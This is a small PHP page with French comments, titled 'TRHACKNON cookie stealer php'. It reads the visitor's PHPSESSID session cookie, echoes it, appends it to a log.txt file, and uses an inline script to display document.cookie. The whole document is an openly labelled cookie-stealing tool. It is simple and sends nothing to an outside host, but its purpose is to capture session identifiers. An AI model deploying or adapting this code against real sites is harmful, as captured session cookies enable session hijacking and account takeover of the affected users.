<?php
    //On démarre une nouvelle session
    session_start();
    /*On utilise session_id() pour récupérer l'id de session s'il existe.
     *Si l'id de session n'existe  pas, session_id() rnevoie une chaine
     *de caractères vide*/
    $id_session = session_id();
            if($id_session){
                echo 'ID de session (récupéré via session_id()) : <br>'
                .$id_session. '<br>';
            }
            echo '<br><br>';
            if(isset($_COOKIE['PHPSESSID'])){
                echo 'ID de session (récupéré via $_COOKIE) : <br>'
                .$_COOKIE['PHPSESSID'];
            }
$cookies = $_COOKIE['PHPSESSID'];
$file = fopen('log.txt', 'a');
fwrite($file, $_COOKIE['PHPSESSID'] . "\n\n");
var_dump($_COOKIE['PHPSESSID']);
?>
<!DOCTYPE html>
<html>
    <head>
        <title>TRHACKNON cookie stealer php</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="cours.css">
    </head>
    
    <body>
        <h1>TRHACKNON cookie php stealer </h1>
        <p>Un <script>prompt("trhacknon cookie stealer :",document.cookie)</script></p>
    </body>
</html>
